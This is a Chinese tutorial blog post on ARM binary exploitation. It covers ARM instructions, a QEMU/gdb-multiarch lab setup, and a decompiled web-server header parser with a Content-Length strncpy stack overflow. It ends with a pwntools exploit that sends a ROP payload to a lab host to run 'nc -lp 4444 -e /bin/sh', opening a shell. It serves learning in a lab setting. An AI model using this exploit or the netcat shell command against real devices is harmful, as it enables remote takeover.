@@ -1,0 +1,639 @@
+➜Arm pwn学习
+http://www.sohu.com/a/411940505_99907709	9000
+<p><span style="font-size: 16px;">刚刚开始学习ARM pwn，下面如有错误，希望各位大佬多多包han，多多包涵。</span></p>
+<p><span style="font-size: 16px;">先介绍下 Arm的一些常见指令</span></p>
+<p><span style="font-size: 16px;">那就先来</span></p>
+<p><span style="font-size: 16px;">Arm 三操作数指令</span></p>
+<p>LDRB R0, [R1, <span>#-1] # 把R1-1的地址的值给R0</span></p>
+<p>立即数前面加个 ` <span>#`</span></p>
+<p><span style="font-size: 16px;">看看函数开始时</span></p>
+<p>PUSH {R4,R5,R7,LR} </p>
+<p>STMFD SP!, {R4-R11,LR} </p>
+<p>这两条指令都常见在函数的开始 </p>
+<p>都是 压入栈中 </p>
+<p><span style="font-size: 16px;">Arm指令中的 - 感觉蛮简洁的，可以省略很多步骤和指令。</span></p>
+<p>{R0-R4} 就是指 R0 R1 R2 R3 R4 寄存器 </p>
+<p><span style="font-size: 16px;">Arm LDR 指令</span></p>
+<p>ldr指令的格式： </p>
+<p>LDR R0, [R1] </p>
+<p>LDR R0, =NAME </p>
+<p>LDR R0, =0X123 </p>
+<p>对于第一种没有等号的情况，R1寄存器对应地址的数据被取出放入R0 </p>
+<p>对于第二种有等号的情况，R0寄存器的值将为NAME标号对应的地址。 </p>
+<p>对于第三种有等号的情况，R0寄存器的值将为立即数的值 </p>
+<p style="text-align: left;"><span style="font-size: 16px;">LDM 和 STM是多数据传送指令，用来装载和存储多个字的数据从/到内存。比如：</span></p>
+<p>STMFD SP!, {R4-R11,LR} 的伪代码如下 </p>
+<p>SP ＝ SP － 9×4； </p>
+<p>address = SP; </p>
+<p>for i = 4 to 11 </p>            <div class="lookall-box">
+<div class="lookall-shadow"></div>
+<section class="lookall">
+<a href="javascript:;" class="show-all" id="showMore">
+<em>展开全文</em>
+</a>
+</section>
+</div>
+<div class="hidden-content control-hide">
+<p>Memory[address] = Ri; </p>
+<p>address = address + 4; </p>
+<p>Memory[address] = LR; </p>
+<p>总的来说就是 把{R4-R11}压到栈中，然后再把LR压到栈中 </p>
+<p>指令格式是: </p>
+<p>xxM{条件}{类型} Rn{!}, &lt;寄存器列表&gt;{^} </p>
+<p>‘xx’是 LD 表示装载，或 ST 表示存储。 </p>
+<p>再加 4 种‘类型’就变成了 8 个指令: </p>
+<p>栈 其他 </p>
+<p>LDMED LDMIB 预先增加装载 </p>
+<p>LDMFD LDMIA 过后增加装载 </p>
+<p>LDMEA LDMDB 预先减少装载 </p>
+<p>LDMFA LDMDA 过后减少装载 </p>
+<p>STMFA STMIB 预先增加存储 </p>
+<p>STMEA STMIA 过后增加存储 </p>
+<p>STMFD STMDB 预先减少存储 </p>
+<p>STMED STMDA 过后减少存储 </p>
+<p><span style="font-size: 16px;">寄存器命名：</span></p>
+<p>
+<table>
+<tbody>
+<tr>
+<th><span style="font-size: 16px;">Reg</span></th>
+<th><span style="font-size: 16px;">APCS</span></th>
+<th><span style="font-size: 16px;">意义</span></th>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R0</span></td>
+<td><span style="font-size: 16px;">A1</span></td>
+<td><span style="font-size: 16px;">工作寄存器</span></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R1</span></td>
+<td><span style="font-size: 16px;">A2</span></td>
+<td></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R2</span></td>
+<td><span style="font-size: 16px;">A3</span></td>
+<td></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R3</span></td>
+<td><span style="font-size: 16px;">A4</span></td>
+<td></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R4</span></td>
+<td><span style="font-size: 16px;">V1</span></td>
+<td><span style="font-size: 16px;">必须保护</span></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R5</span></td>
+<td><span style="font-size: 16px;">V2</span></td>
+<td></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R6</span></td>
+<td><span style="font-size: 16px;">V3</span></td>
+<td></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R7</span></td>
+<td><span style="font-size: 16px;">V4</span></td>
+<td></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R8</span></td>
+<td><span style="font-size: 16px;">V5</span></td>
+<td></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R9</span></td>
+<td><span style="font-size: 16px;">V6,SB</span></td>
+<td><span style="font-size: 16px;">静态基址寄存器</span></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R10</span></td>
+<td><span style="font-size: 16px;">SL,v7</span></td>
+<td><span style="font-size: 16px;">堆栈限制寄存器</span></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R11</span></td>
+<td><span style="font-size: 16px;">FP,v8</span></td>
+<td><span style="font-size: 16px;">帧指针，用于保存栈帧</span></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R12</span></td>
+<td><span style="font-size: 16px;">IP</span></td>
+<td><span style="font-size: 16px;">指令指针</span></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R13</span></td>
+<td><span style="font-size: 16px;">SP</span></td>
+<td><span style="font-size: 16px;">栈顶指针</span></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R14</span></td>
+<td><span style="font-size: 16px;">LR</span></td>
+<td><span style="font-size: 16px;">链接寄存器，保存的是函数的返回地址</span></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">R15</span></td>
+<td><span style="font-size: 16px;">PC</span></td>
+<td><span style="font-size: 16px;">程序计数器,就是下一条指令的地址</span></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">CPSR</span></td>
+<td></td>
+<td><span style="font-size: 16px;">程序状态寄存器</span></td>
+</tr>
+<tr>
+<td><span style="font-size: 16px;">SPSR</span></td>
+<td></td>
+<td><span style="font-size: 16px;">程序状态寄存器</span></td>
+</tr>
+</tbody>
+</table></p>
+<p><span style="font-size: 16px;">在常见的程序中 前面的命名一般都是以R*，一些比较特殊的寄存器，就命令，比如 LR SP 在IDA里面都是显示APCS。</span></p>
+<p>STR(存储) 和 LDR(装载) 是来存储 和 装载单一字节或字的数据从/到内存 </p>
+<p>LDR{条件} Rd, &lt;地址&gt; </p>
+<p>STR{条件} Rd, &lt;地址&gt; </p>
+<p>在STR 、LDR、 MOV后面加上EQ 代表的是 32位 </p>
+<p>ldr = Load Word </p>
+<p>ldrh = Load unsigned Half Word </p>
+<p>ldrsh = Load signed Half Word </p>
+<p>ldrb = Load unsigned Byte </p>
+<p>ldrsb = Load signed Bytes </p>
+<p>str = Store Word </p>
+<p>strh = Store unsigned Half Word </p>
+<p>strsh = Store signed Half Word </p>
+<p>strb = Store unsigned Byte </p>
+<p>strsb = Store signed Byte </p>
+<p><span style="font-size: 16px;">Arm 跳转</span></p>
+<p>B address #就像是jmp </p>
+<p>BL #后面加分支 # 相当于call </p>
+<p>BL strncpy </p>
+<p>BEQ #不等于 想到于 jne </p>
+<p>BCC #进位清除，应该就是 cmp后，进位为0就跳 感觉就像是 &lt; </p>
+<p>BGT # 大于 </p>
+<p>BLT #小于 </p>
+<p>BCS #进位设置，应该就是cmp后，有进位 感觉就像是 &gt;= </p>
+<p>BLX #实现跳转的同时切换ARM的状态ARM-&gt;Thunb或者Thunb-&gt;ARM </p>
+<p>BX #可以跳转到ARM指令或者Thumb指令 </p>
+<p><span style="font-size: 16px;">Arm 程序状态寄存器处理指令</span></p>
+<p>MRS：用于将程序状态寄存器的内容送到通用寄存器 </p>
+<p>MSR：将操作数的内容送到程序状态寄存器的特定域 </p>
+<p><span style="font-size: 16px;">Arm 比较指令</span></p>
+<p>CMP 这个跟 x86的差不多，不改变寄存器的值,更新CPSR标志寄存器 </p>
+<p>TST 感觉跟 <span>test</span>有点像 都是不影响目的寄存器的值，改变状态寄存器 </p>
+<p><span style="font-size: 16px;">Arm 标志位</span></p>
+<p>
+<table>
+<tbody>
+<tr>
+<th>标记</th>
+<th>含义</th>
+</tr>
+<tr>
+<td>N（Negative）</td>
+<td>指令执行结果为负时置1</td>
+</tr>
+<tr>
+<td>Z（Zero）</td>
+<td>指令执行结果为0时置1</td>
+</tr>
+<tr>
+<td>C（Carry）</td>
+<td>加法有进位则置1否则置0，减法有借位则置0否则置1</td>
+</tr>
+<tr>
+<td>V（oVerflow）</td>
+<td>指令执行结果超出32位补码存储范围时置1</td>
+</tr>
+<tr>
+<td>E（Endian-bit）</td>
+<td>置0时使用小端序，置1时使用大端序</td>
+</tr>
+<tr>
+<td>T（Thumb-bit）</td>
+<td>置1时使用Thumb模式，置0时使用ARM模式 Thumb 模式就是16位,ARM就是32位</td>
+</tr>
+<tr>
+<td>M（Mode-bit）</td>
+<td>共5位表示处理器运行模式</td>
+</tr>
+<tr>
+<td>J（Jazelle）</td>
+<td>对于有的处理器，置位表示允许以硬件执行java字节码</td>
+</tr>
+</tbody>
+</table></p>
+<p><span style="font-size: 16px;">做题，了解这些指令就差不多了</span></p>
+<p><span style="font-size: 16px;"><strong>环境搭建</strong></span></p>
+<p><span style="font-size: 16px;">可以用qemu-arm加 gdb-multiarch , gdb-multiarch 加gdbserver或者直接arm_now (后面这个。我安装了还是不太会用。逃····</span></p>
+<p><strong><span style="font-size: 16px;">第一种</span></strong></p>
+<p><span style="font-size: 16px;">这种我没具体的调试过，之前就用了一次，感觉没第二种舒服</span></p>
+<p>sudo apt-get install git gdb gdb-multiarch </p>
+<p>apt search <span>"libc6-"</span>| grep <span>"arm"</span></p>
+<p>sudo apt-get install -y gcc-arm-linux-gnueabi </p>
+<p>qemu-arm -g port -L /usr/arm-linux-gnueabi ./pwn </p>
+<p>这是运行程序，-L是依赖库 </p>
+<p>然后用gdb-multiarch </p>
+<p>targe remote 上去 </p>
+<p><strong><span style="font-size: 16px;">第二种</span></strong></p>
+<p><span style="font-size: 16px;">首先先下载 arm-debian的qemu镜像</span></p>
+<p style="text-align: left;">https://people.debian.org/~aurel32/qemu/armel/ or </p>
+<p style="text-align: left;">https://people.debian.org/~aurel32/qemu/armhf/ </p>
+<p><span>#这些都是在本机进行操作</span></p>
+<p>sudo tunctl -t tap0 -u `whoami` <span>#这边新建一张网卡和虚拟机进行通信</span></p>
+<p>sudo ifconfig tap0 192.168.2.1/24 <span>#给网卡配置ip</span></p>
+<p><span>#这个配置要在一个段上面，这个是为了后面方便传文件进qemu虚拟机里面</span></p>
+<p><span>#然后</span></p>
+<p>qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append <span>"root=/dev/sda1"</span>-net nic -net tap,ifname=tap0,=no,down=no -nographic <span>#启动虚拟机镜像</span></p>
+<p><span>#如果下载的是armel 就上面的，gdbserver也要用对应的armel</span></p>
+<p><span>#如果下载的是armhf 就对应改下几个就可以</span></p>
+<p><span>#具体参数 可以 sudo qemu-system-arm -h 查看</span></p>
+<p><span>#然后最后把simpleHTTPServer起来就OK</span></p>
+<p><span>#在想传文件的目录运行</span></p>
+<p>python -m SimpleHTTPServer <span>#默认起8000端口，反正这端口一般也没用，懒得改默认了</span></p>
+<p><span>#然后进入虚拟机</span></p>
+<p><span>#密码账号都是root</span></p>
+<p><span>#进去之后 如果是固件的话一般都是能把整个环境弄到，那就用chroot起，这样方便，chroot起的，</span></p>
+<p><span>#要把proc和dev挂载到chroot起了之后的根目录</span></p>
+<p>sudo mount -o <span>bind</span>/dev ./squashfs-root/dev </p>
+<p>sudo mount -t proc /proc ./squashfs-root/proc </p>
+<p><span>#然后也配置网卡地址</span></p>
+<p>ifconfig eth0 192.168.2.2/24 </p>
+<p><span>#然后用 </span></p>
+<p>wget http://x.x.x.x:8000/filename </p>
+<p><span>#把文件给拷进来,调试程序，gdbserver都是需要拷进来</span></p>
+<p><span>#gdbserver 下载链接</span></p>
+<p><span>#https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt</span></p>
+<p><span>#chroot</span></p>
+<p>chroot . sh </p>
+<p><span>#用gdbsever起环境</span></p>
+<p><span>#gdb-multiarch attach上去就能调试了</span></p>
+<p><span style="font-size: 16px;">其他：</span></p>
+<p>qemu-arm-static 可以运行静态编译的可执行程序 </p>
+<p>sudo apt install qemu-user-static </p>
+<p>这个可以用来调试静态编译的文件 </p>
+<p><span style="font-size: 16px;">实例调试分析</span></p>
+<p><span style="font-size: 16px;">就只开了 nx</span></p>
+<p><span style="font-size: 16px;">漏洞所在的函数</span></p>
+<p>int __fastcall sub_17F80(char *a1) </p>
+<p>{ </p>
+<p>char *v1; // r4 </p>
+<p>char *v2; // r0 </p>
+<p>int v3; // r3 </p>
+<p>char *v4; // r5 </p>
+<p>unsigned int v5; // r9 </p>
+<p>unsigned __int8 *v6; // r8 </p>
+<p>char *v7; // r3 </p>
+<p>int v8; // r6 </p>
+<p>int v9; // t1 </p>
+<p>int v10; // r10 </p>
+<p>int v11; // r2 </p>
+<p>int v12; // r2 </p>
+<p>unsigned __int8 *v13; // r0 </p>
+<p>bool v14; // zf </p>
+<p>int v15; // r2 </p>
+<p>int v16; // t1 </p>
+<p>bool v17; // zf </p>
+<p>char *v18; // ST14_4 </p>
+<p>int v19; // r0 </p>
+<p>int v20; // r2 </p>
+<p>int v21; // r1 </p>
+<p>ssize_t v22; // r5 </p>
+<p>int v23; // r2 </p>
+<p>char *v24; // r0 </p>
+<p>const char *v25; // r6 </p>
+<p>char *v26; // r0 </p>
+<p>int result; // r0 </p>
+<p>int v28; // r6 </p>
+<p>FILE *v29; // r0 </p>
+<p>int v30; // r6 </p>
+<p>FILE *v31; // r0 </p>
+<p>const char *v32; // r1 </p>
+<p>int v33; // r2 </p>
+<p>int v34; // r3 </p>
+<p>char *v35; // r7 </p>
+<p>char *v36; // r6 </p>
+<p>char *v37; // r0 </p>
+<p>int v38; // r7 </p>
+<p>int v39; // r0 </p>
+<p>int v40; // r2 </p>
+<p>unsigned int v41; // r3 </p>
+<p>char *haystack; // [sp+Ch] [bp-44h] </p>
+<p>char dest[4]; // [sp+18h] [bp-38h] </p>
+<p>int v44; // [sp+1Ch] [bp-34h] </p>
+<p>int v45; // [sp+20h] [bp-30h] </p>
+<p>int v46; // [sp+24h] [bp-2Ch] </p>
+<p>v1 = a1; </p>
+<p>haystack = a1 + 13690; </p>
+<p>v2 = strncpy(a1 + 21882, a1 + 13690, 0x1FFFu); </p>
+<p>v3 = *((_DWORD *)v1 + 1629); </p>
+<p>v4 = &amp;v1[*((_DWORD *)v1 + 18) + 13690]; </p>
+<p>v5 = (unsigned int)&amp;haystack[v3]; </p>
+<p><span>if</span>( dword_34864 &amp; 0x10 &amp;&amp; (unsigned int)v4 &lt; v5 ) </p>
+<p>{ </p>
+<p>haystack[v3] = 0; </p>
+<p>sub_16534(v2); </p>
+<p>fprintf((FILE *)stderr, <span>"%s:%d - Parsing headers ("%s")n"</span>, <span>"src/read.c"</span>, 57, v4); </p>
+<p>} </p>
+<p>v6 = (unsigned __int8 *)(v4 - 1); </p>
+<p>v7 = v4; </p>
+<p><span>if</span>( (unsigned int)v4 &gt;= v5 ) </p>
+<p>{ </p>
+<p>LABEL_26: </p>
+<p><span>if</span>( *(_DWORD *)v1 &gt; 3u ) </p>
+<p><span>return</span>1; </p>
+<p>v21 = *((_DWORD *)v1 + 1629); </p>
+<p><span>if</span>( (unsigned int)(0x1FFF - v21) &gt;= 0x2000 ) </p>
+<p>{ </p>
+<p>sub_1627C(v1); </p>
+<p>fwrite( <span>"No space left in client stream buffer, closingn"</span>, 1u, 0x2Fu, (FILE *)stderr); </p>
+<p>result = 0; </p>
+<p>*((_DWORD *)v1 + 4) = 400; </p>
+<p>*(_DWORD *)v1 = 12; </p>
+<p><span>return</span>result; </p>
+<p>} </p>
+<p>v22 = <span>read</span>(*((_DWORD *)v1 + 1112), &amp;haystack[v21], 0x2000 - v21); </p>
+<p><span>if</span>( !strncmp(haystack, <span>"POST"</span>, 4u) || (v26 = (char *)strncmp(haystack, <span>"PUT"</span>, 3u)) == 0 ) </p>
+<p>{ </p>
+<p>v23 = (unsigned __int8)v1[13690]; </p>
+<p>*(_DWORD *)dest = 0; </p>
+<p>v44 = 0; </p>
+<p>v45 = 0; </p>
+<p>v46 = 0; </p>
+<p><span>if</span>( v23 ) </p>
+<p>{ </p>
+<p>v35 = strstr(haystack, <span>"Content-Length"</span>); </p>
+<p>v36 = strchr(v35, <span>'n'</span>); </p>
+<p>v37 = strchr(v35, <span>':'</span>); </p>
+<p>strncpy(dest, v37 + 1, v36 - (v37 + 1)); // 这里复制有bug </p>
+<p>} </p>
+<p>v24 = strstr(haystack, <span>"rnrn"</span>); </p>
+<p><span>if</span>( v24 &amp;&amp; (v25 = v24 + 4, (signed int)(v24 + 4) &lt;= (signed int)&amp;haystack[*((_DWORD *)v1 + 1629) - 1 + v22]) ) </p>
+<p>{ </p>
+<p>v26 = strstr(haystack, <span>"upgrade.cgi"</span>); </p>
+<p><span>if</span>( !v26 || (v26 = strstr(v25, <span>"rnrn"</span>)) != 0 ) </p>
+<p>{ </p>
+<p>*((_DWORD *)v1 + 7623) = -1; </p>
+<p>goto LABEL_36; </p>
+<p>} </p>
+<p>v30 = (int)(v1 + 28672); </p>
+<p>++*((_DWORD *)v1 + 7623); </p>
+<p>v31 = (FILE *)stderr; </p>
+<p>v32 = <span>"req-&gt;iCount++(2)= %dn"</span>; </p>
+<p>} </p>
+<p><span>else</span></p>
+<p>{ </p>
+<p>v30 = (int)(v1 + 28672); </p>
+<p>v31 = (FILE *)stderr; </p>
+<p>v32 = <span>"req-&gt;iCount++= %dn"</span>; </p>
+<p>++*((_DWORD *)v1 + 7623); </p>
+<p>} </p>
+<p>fprintf(v31, v32); </p>
+<p>v33 = *(_DWORD *)(v30 + 1820); </p>
+<p>v26 = (char *)(1717986919 * v33); </p>
+<p>*(_DWORD *)(v30 + 1820) = v33 % 20; </p>
+<p>} </p>
+<p>LABEL_36: </p>
+<p><span>if</span>( v22 &lt; 0 ) </p>
+<p>{ </p>
+<p>v34 = *_errno_location; </p>
+<p><span>if</span>( v34 != 4 ) </p>
+<p>{ </p>
+<p><span>if</span>( v34 == 11 ) </p>
+<p><span>return</span>-1; </p>
+<p>sub_1627C(v1); </p>
+<p>perror( <span>"header read"</span>); </p>
+<p>*((_DWORD *)v1 + 4) = 400; </p>
+<p><span>return</span>0; </p>
+<p>} </p>
+<p>} </p>
+<p><span>else</span></p>
+<p>{ </p>
+<p><span>if</span>( !v22 ) </p>
+<p>{ </p>
+<p><span>if</span>( *((_DWORD *)v1 + 1628) &gt;= (unsigned int)dword_37E6C || *((_DWORD *)v1 + 15) || *((_DWORD *)v1 + 1629) ) </p>
+<p>{ </p>
+<p>sub_1627C(v1); </p>
+<p>fwrite( <span>"client unexpectedly closed connection.n"</span>, 1u, 0x27u, (FILE *)stderr); </p>
+<p>} </p>
+<p>*((_DWORD *)v1 + 4) = 400; </p>
+<p><span>return</span>0; </p>
+<p>} </p>
+<p>v14 = (dword_34864 &amp; 0x10) == 0; </p>
+<p>*((_DWORD *)v1 + 1629) += v22; </p>
+<p><span>if</span>( !v14 ) </p>
+<p>{ </p>
+<p>sub_16534(v26); </p>
+<p>v29 = (FILE *)stderr; </p>
+<p>v1[*((_DWORD *)v1 + 1629) + 13690] = 0; </p>
+<p>fprintf(v29, <span>"%s:%d -- We read %d bytes: "%s"n"</span>, <span>"src/read.c"</span>, 356, v22, <span>""</span>); </p>
+<p>} </p>
+<p>} </p>
+<p><span>return</span>1; </p>
+<p>} </p>
+<p><span>while</span>( 2 ) </p>
+<p>{ </p>
+<p><span>if</span>( *((_DWORD *)v1 + 7623) &gt; 0 ) </p>
+<p>goto LABEL_26; </p>
+<p>v9 = (unsigned __int8)*v4++; </p>
+<p>v8 = v9; </p>
+<p>v10 = v9 - 13; </p>
+<p><span>if</span>( v9 != 13 ) </p>
+<p>v10 = 1; </p>
+<p><span>if</span>( v8 == 161 ) </p>
+<p>v11 = v10 &amp; 1; </p>
+<p><span>else</span></p>
+<p>v11 = 0; </p>
+<p><span>if</span>( v11 ) </p>
+<p>{ </p>
+<p>v12 = *v6; </p>
+<p>v13 = v6; </p>
+<p>v14 = v12 == 0; </p>
+<p><span>if</span>( *v6 ) </p>
+<p>v14 = v12 == 10; </p>
+<p><span>if</span>( !v14 ) </p>
+<p>{ </p>
+<p><span>do</span></p>
+<p>{ </p>
+<p>v16 = *(v13-- - 1); </p>
+<p>v15 = v16; </p>
+<p>v17 = v16 == 0; </p>
+<p><span>if</span>( v16 ) </p>
+<p>v17 = v15 == 10; </p>
+<p>} </p>
+<p><span>while</span>( !v17 ); </p>
+<p>} </p>
+<p>v18 = v7; </p>
+<p>v19 = strncmp((const char *)v13 + 1, <span>"User-Agent:"</span>, 0xBu); </p>
+<p>v7 = v18; </p>
+<p><span>if</span>( v19 ) </p>
+<p>{ </p>
+<p>sub_1627C(v1); </p>
+<p>fprintf((FILE *)stderr, <span>"Illegal character (%d) in stream.n"</span>, 161); </p>
+<p>sub_1BC48(v1); </p>
+<p><span>return</span>0; </p>
+<p>} </p>
+<p>} </p>
+<p>v20 = *(_DWORD *)v1; </p>
+<p>switch ( *(_DWORD *)v1 ) </p>
+<p>{ </p>
+<p><span>case</span>0: </p>
+<p><span>if</span>( v8 == 13 ) </p>
+<p>{ </p>
+<p>*((_DWORD *)v1 + 17) = v7; </p>
+<p>*(_DWORD *)v1 = 1; </p>
+<p>goto LABEL_24; </p>
+<p>} </p>
+<p><span>if</span>( v8 != 10 ) </p>
+<p>goto LABEL_24; </p>
+<p>*((_DWORD *)v1 + 17) = v7; </p>
+<p>*(_DWORD *)v1 = 2; </p>
+<p>goto LABEL_52; </p>
+<p><span>case</span>1: </p>
+<p><span>if</span>( v8 != 10 ) </p>
+<p>goto LABEL_22; </p>
+<p>*(_DWORD *)v1 = 2; </p>
+<p>LABEL_52: </p>
+<p>++*((_DWORD *)v1 + 18); </p>
+<p>goto LABEL_53; </p>
+<p><span>case</span>2: </p>
+<p><span>if</span>( v8 == 13 ) </p>
+<p>{ </p>
+<p>*(_DWORD *)v1 = 3; </p>
+<p>goto LABEL_24; </p>
+<p>} </p>
+<p><span>if</span>( v8 != 10 ) </p>
+<p>{ </p>
+<p>LABEL_23: </p>
+<p>*(_DWORD *)v1 = 0; </p>
+<p>LABEL_24: </p>
+<p>++*((_DWORD *)v1 + 18); </p>
+<p>LABEL_25: </p>
+<p>++v6; </p>
+<p>v7 = v4; </p>
+<p><span>if</span>( (unsigned int)v4 &gt;= v5 ) </p>
+<p>goto LABEL_26; </p>
+<p><span>continue</span>; </p>
+<p>} </p>
+<p>LABEL_45: </p>
+<p>++*((_DWORD *)v1 + 18); </p>
+<p>*(_DWORD *)v1 = 4; </p>
+<p>LABEL_46: </p>
+<p>v28 = sub_1A4F4(v1); </p>
+<p><span>if</span>( !v28 ) </p>
+<p><span>return</span>0; </p>
+<p><span>if</span>( (unsigned int)(*((_DWORD *)v1 + 3) - 3) &gt; 1 ) </p>
+<p><span>return</span>v28; </p>
+<p>v38 = *((_DWORD *)v1 + 42); </p>
+<p>*((_DWORD *)v1 + 17) = &amp;v1[*((_DWORD *)v1 + 1629) + 13690]; </p>
+<p>*((_DWORD *)v1 + 16) = v4; </p>
+<p>*(_DWORD *)v1 = 5; </p>
+<p><span>if</span>( !v38 ) </p>
+<p>{ </p>
+<p>sub_1627C(v1); </p>
+<p>fwrite( <span>"Unknown Content-Length POST!n"</span>, 1u, 0x1Du, (FILE *)stderr); </p>
+<p>sub_1BC48(v1); </p>
+<p><span>return</span>0; </p>
+<p>} </p>
+<p>v39 = sub_216EC(v38); </p>
+<p><span>if</span>( v39 &lt; 0 ) </p>
+<p>{ </p>
+<p>sub_1627C(v1); </p>
+<p>fprintf((FILE *)stderr, <span>"Invalid Content-Length [%s] on POST!n"</span>, *((_DWORD *)v1 + 42)); </p>
+<p>sub_1BC48(v1); </p>
+<p><span>return</span>0; </p>
+<p>} </p>
+<p>v40 = *((_DWORD *)v1 + 16); </p>
+<p>v41 = *((_DWORD *)v1 + 17) - v40; </p>
+<p>*((_DWORD *)v1 + 11) = v39; </p>
+<p>*((_DWORD *)v1 + 12) = 0; </p>
+<p><span>if</span>( v39 &gt;= v41 ) </p>
+<p><span>return</span>v28; </p>
+<p>*((_DWORD *)v1 + 17) = v40 + v39; </p>
+<p><span>return</span>v28; </p>
+<p><span>case</span>3: </p>
+<p><span>if</span>( v8 == 10 ) </p>
+<p>goto LABEL_45; </p>
+<p>LABEL_22: </p>
+<p><span>if</span>( v10 ) </p>
+<p>goto LABEL_23; </p>
+<p>goto LABEL_24; </p>
+<p>default: </p>
+<p>++*((_DWORD *)v1 + 18); </p>
+<p><span>if</span>( v20 == 2 ) </p>
+<p>{ </p>
+<p>LABEL_53: </p>
+<p>**((_BYTE **)v1 + 17) = 0; </p>
+<p><span>if</span>( *((_DWORD *)v1 + 17) - *((_DWORD *)v1 + 16) &gt; 3071 ) </p>
+<p>{ </p>
+<p>sub_1627C(v1); </p>
+<p>fprintf( </p>
+<p>(FILE *)stderr, </p>
+<p><span>"Header too long at %lu bytes: "%s"n"</span>, </p>
+<p>*((_DWORD *)v1 + 17) - *((_DWORD *)v1 + 16)); </p>
+<p>sub_1BC48(v1); </p>
+<p><span>return</span>0; </p>
+<p>} </p>
+<p><span>if</span>( *((_DWORD *)v1 + 15) ) </p>
+<p>{ </p>
+<p><span>if</span>( !sub_1A878(v1) ) </p>
+<p><span>return</span>0; </p>
+<p>} </p>
+<p><span>else</span></p>
+<p>{ </p>
+<p><span>if</span>( !sub_19FF0(v1) ) </p>
+<p><span>return</span>0; </p>
+<p><span>if</span>( *((_DWORD *)v1 + 2) == 1 ) </p>
+<p><span>return</span>sub_1A4F4(v1); </p>
+<p>} </p>
+<p>*((_DWORD *)v1 + 16) = v4; </p>
+<p>} </p>
+<p><span>else</span><span>if</span>( v20 == 4 ) </p>
+<p>{ </p>
+<p>goto LABEL_46; </p>
+<p>} </p>
+<p>goto LABEL_25; </p>
+<p>} </p>
+<p>} </p>
+<p>} </p>
+<p><span style="font-size: 16px;">上面看到 strcpy存在bug，就是长度时按照输入来计算的，这时只要控制好，就能实现栈溢出。</span></p>
+<p><span style="font-size: 16px;">先看看前面的的指令有没分析正确</span></p>
+<p style="text-align: center;"><img src="http://p2.itc.cn/q_70/images03/20200807/e283a499941041878eb1ad2770e7a95f.png" /></p>
+<p><span style="font-size: 16px;">能看出那些寄存器是用来做参数的 r0 r1 r2 ，然后依次往后</span></p>
+<p><img src="http://p5.itc.cn/q_70/images03/20200807/170e15803d034732a1d1d7b9c71df564.png" /></p>
+<p><span style="font-size: 16px;">r3 是栈顶指针，lr是保存着返回地址，pc就是当前指令的下一条，cpsr 程序状态寄存器</span></p>
+<p><span style="font-size: 16px;">看看程序开头和结尾</span></p>
+<p><span style="font-size: 16px;">开头</span></p>
+<p><img src="http://p1.itc.cn/q_70/images03/20200807/19654dad932a4dfca4040d293f3ac418.png" /></p>
+<p><span style="font-size: 16px;">结尾</span></p>
+<p style="text-align: center;"><img src="http://p8.itc.cn/q_70/images03/20200807/32b19c61fcf641d0a3f2070ecd74f594.png" /></p>
+<p><span style="font-size: 16px;">R4-R11，LR都是放进栈里，如果发生了栈溢出，那岂不是能基本控制大多数的参数了，前面4个没有控制，我估摸着是用来做 传参用的。</span></p>
+<p><span style="font-size: 16px;">这道题还是把aslr关了。</span></p>
+<p><span style="font-size: 16px;">看到上图就清楚，此时的栈已经被控制了，执行为箭头所指向的，那r4-r11，LR都给控制了。</span></p>
+<p><span style="font-size: 16px;">关了aslr就是直接执行system了，但是得控制参数，这个就直接用ROPgadgets就OK了</span></p>
+<p><span style="font-size: 16px;">直接控制R0就ok</span></p>
+<p><span style="font-size: 16px;">exp：</span></p>
+<p><span>from</span>pwn <span>import</span>* </p>
+<p>context.log_level = <span>'debug'</span></p>
+<p>p = remote( <span>"192.168.2.2"</span>, <span>80</span>) </p>
+<p>system_addr = <span>0x76f74ab0</span></p>
+<p>order_commad = <span>"nc -lp 4444 -e /bin/sh;pwd;pwd;"</span></p>
+<p>pre = <span>"POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:"</span></p>
+<p>payload = <span>"a"</span>* <span>52</span>+p32( <span>0x00048784</span>+ <span>0x76f2d000</span>)+p32( <span>0x7effeb68</span>)+p32( <span>0x00016aa4</span>+ <span>0x76f2d000</span>)+ <span>'a'</span>* <span>8</span>+p32(system_addr) </p>
+<p>payload = pre+payload+order_commad+ <span>"nrnrn"</span></p>
+<p>p.sendline(payload) </p>
+<p>p.interactive </p>
+<p><strong><span style="font-size: 16px;">参考链接：</span></strong></p>
+<ul>
+<li></li>
+<li></li>
+<li></li>
+<li></li>
+</ul>
+<p><span style="font-size: 16px;">ARM漏洞利用技术一--编写arm shellcode </span></p>
+<p><span style="font-size: 16px;">https://www.hetianlab.com/expc.do?ec=ECID3ab6-0a4a-40bb-88e8-d19efce371b5</span></p>
+<p><span style="font-size: 16px;">（通过该实验了解arm环境下编写shellcode的基本过程，以execve为例，详细介绍了相关步骤，包括系统调用、系统调用后、函数参数、去除空字符、转换进制等。）</span></p>
+<p><span style="font-size: 16px;">重金悬赏 | 合天原创投稿涨稿费啦！ </span></p>
